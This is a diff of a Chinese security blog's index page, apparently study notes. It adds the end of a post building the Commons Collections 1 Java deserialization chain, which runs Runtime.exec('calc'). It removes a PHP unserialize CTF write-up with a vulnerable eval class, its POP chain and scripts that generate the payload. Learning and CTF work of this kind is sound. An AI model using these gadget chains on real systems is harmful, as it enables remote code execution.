+<p>//        for(Map.Entry entry:transformedMap.entrySet()) {<br>//            entry.setValue(r);//输入要运行的方法<br>//        }</p>
+<pre><code>    //---------------------------
+
+    //Runtime r = Runtime.getRuntime();
+</code></pre>
+<p>//        InvokerTransformer invokerTransformer = new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”});<br>//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();<br>//        map.put(“key”,”aaa”);//这一步的目的是保证map里面有东西，不然for循环不会运行<br>//<br>//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);<br>//<br>//        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+//        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型<br>//        anno.setAccessible(true);//设置权限，可以访问<br>//        Object o = anno.newInstance(Override.class, transformedMap);//实例化<br>//        serialize(o);//序列化<br>//        unserialize(“ser.bin”);//反序化</p>
+<pre><code>    //---------------------------
+
+
+
+
+    //Class c= Runtime.class;
+    //Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);//null代表是一个无参方法
+    //Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);//反射调用，第一个null意味是一个静态方法，第二个意味着无参
+    //Method execMethod = c.getMethod(&quot;exec&quot;, String.class);
+    //execMethod.invoke(r,&quot;calc&quot;);//反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数
+
+    //---------------------------
+    //逐条转换，套用到InvokerTransformer方法中
+</code></pre>
+<p>//        Method getRuntimeMethod = (Method) new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}).transform(Runtime.class);//作用为c.getMethod(“getRuntime”, null);<br>//        //其中的String.class, Class[].class是getMethod的参数类型getRuntime, null是参数,最后用Runtime.class调用（相当于那个c）<br>//        Runtime r = (Runtime) new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);//相当于Method execMethod = c.getMethod(“exec”, String.class);<br>//        new InvokerTransformer(“exec”,new Class[]{String.class},new Object[]{“calc”}).transform(r);//相当于Method execMethod = c.getMethod(“exec”, String.class);execMethod.invoke(r,”calc”);<br>        // 反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数</p>
+<pre><code>    //---------------------------
+
+    //简化
+</code></pre>
+<p>//        Transformer[] transformers = {<br>//                new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}),<br>//                new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br>//                new InvokerTransformer(“exec”,new Class[]{String.class},new Object[]{“calc”})<br>//        };<br>//<br>//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);<br>//        chainedTransformer.transform(Runtime.class);//调最初的那个参数</p>
+<pre><code>    //---------------------------
+
+    //加入到反序化
+
+    Transformer[] transformers = new Transformer[]&#123;
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+    &#125;;
+
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+
+    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(&quot;value&quot;,&quot;aaa&quot;);//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value
+
+    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+
+    Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor&lt;?&gt; anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
+    anno.setAccessible(true);//设置权限，可以访问
+    Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
+    serialize(o);//序列化
+    unserialize(&quot;ser.bin&quot;);//反序化
+
+
+&#125;
+
+public static void serialize(Object obj) throws IOException &#123;
+    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+    oos.writeObject(obj);
+&#125;
+
+public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;
+    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+    Object obj = ois.readObject();
+    return obj;
+&#125;
+</code></pre>
+<p>}</p>
+<p>```</p>
+<p>还有一条链（国外的）没有用<code>transformedMap</code>，用的<code>lazyMap</code>（更复杂），有时间去分析一下<br><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></p>
+<p>ysoserial工具：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/01/CC1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-CVE-2022-22965复现及技术栈-利用链代码分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -358,7 +682,7 @@
 <a href="/2022/04/04/vue%E7%AC%94%E8%AE%B0/" title="vue笔记">vue笔记</a>
 <a href="/2022/04/24/CVE-2022-22965%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%8A%80%E6%9C%AF%E6%A0%88-%E5%88%A9%E7%94%A8%E9%93%BE%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" title="CVE-2022-22965复现及技术栈-利用链代码分析">CVE-2022-22965复现及技术栈-利用链代码分析</a>
 <a href="/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/" title="嵌套的反序化问题">嵌套的反序化问题</a>
-<a href="#">Post not found: Invalid post_link</a>
+<a href="/2022/05/01/CC1/" title="CC1">CC1</a>
 <a href="#">Post not found: Invalid post_link</a>
 
 
@@ -1291,101 +1615,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/04/04/vue%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-php反序化（重复利用同一个类）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/">php反序化（重复利用同一个类）</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-03-27T16:22:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>题目：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun&#x3D;&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun&#x3D;&#x3D;&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun&#x3D;$val[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line"></span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun&#x3D;$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb &#x3D; $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class four&#123;</span><br><span class="line">    public $a&#x3D;&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun&#x3D;&#39;abc&#39;;</span><br><span class="line"></span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name&#x3D;$value;</span><br><span class="line">        if ($this-&gt;fun &#x3D; &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;ser&#39;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#39;ser&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;func checkcheck($data)&#123;</span><br><span class="line">&#x2F;&#x2F;  if(preg_match(......))&#123;</span><br><span class="line">&#x2F;&#x2F;      die(something wrong);</span><br><span class="line">&#x2F;&#x2F;  &#125;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;function hint()&#123;</span><br><span class="line">&#x2F;&#x2F;    echo &quot;.......&quot;;</span><br><span class="line">&#x2F;&#x2F;    die();</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>利用链：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class TianXiWei:__wakeup&#123;$this-&gt;ext-&gt;nisa($this-&gt;x);--&gt;class Ilovetxw:__call($fun1,$arg)&#123;$this-&gt;huang-&gt;fun&#x3D;$arg[0];--&gt;class four:__set($name, $value)&#123;strtolower($this-&gt;a);--&gt;class Ilovetxw:__toString()&#123;return $bb();--&gt;class NISA:__invoke()&#123;eval($this-&gt;txw4ever);&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>因为要用两个Ilovetxw类，为了防止出现无线循环，可以分两个文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class four&#123;</span><br><span class="line">	public $a;</span><br><span class="line">    private $fun;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; a &#x3D; new Ilovetxw();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">	public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; su &#x3D; new NISA();</span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class NISA&#123;</span><br><span class="line">	public $fun;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; txw4ever &#x3D; &quot;include(&#39;&#x2F;fllllllaaag&#39;);&quot;;</span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ser&#x3D;new four();</span><br><span class="line">echo urlencode(serialize($ser));</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; ext &#x3D; new Ilovetxw();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">	public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this -&gt; huang &#x3D; unserialize(urldecode(&quot;O%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A24%3A%22include%28%27%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3BN%3B%7D&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser&#x3D;new TianXiWei();</span><br><span class="line">echo urlencode(serialize($ser));</span><br></pre></td></tr></table></figure>
-<p>或者不用<code>__construct</code>赋值，而用<code>__invoke</code>带参,然后new两次，让两次new的内容不一样</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/">展开全文 >></a>
         </p>
       
 
